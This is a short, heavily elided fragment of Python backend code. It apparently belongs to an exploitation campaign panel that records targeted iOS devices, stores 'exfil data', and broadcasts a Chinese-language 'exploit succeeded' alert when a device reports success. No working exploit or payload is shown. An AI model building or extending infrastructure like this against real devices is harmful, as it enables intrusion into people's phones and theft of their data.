...
from ..database import get_db, Device, ExfilData, TrafficChannel, LandingTemplate
...
def _upsert_device(db: Session, device_uuid: str, ip: str, ua: str,
    ...
    if dev is None:
        ...
        if ua:
            dev.user_agent = ua
        if ios_version and not dev.os_version:
...
async def receive_exploit_report(
    ...
    if exploit_status == "success":
        try:
            broadcast_notification_sync(
                db, "漏洞利用成功",
                f"设备 {device_uuid[:12]} 漏洞利用成功 | {ios_version or 'N/A'}",
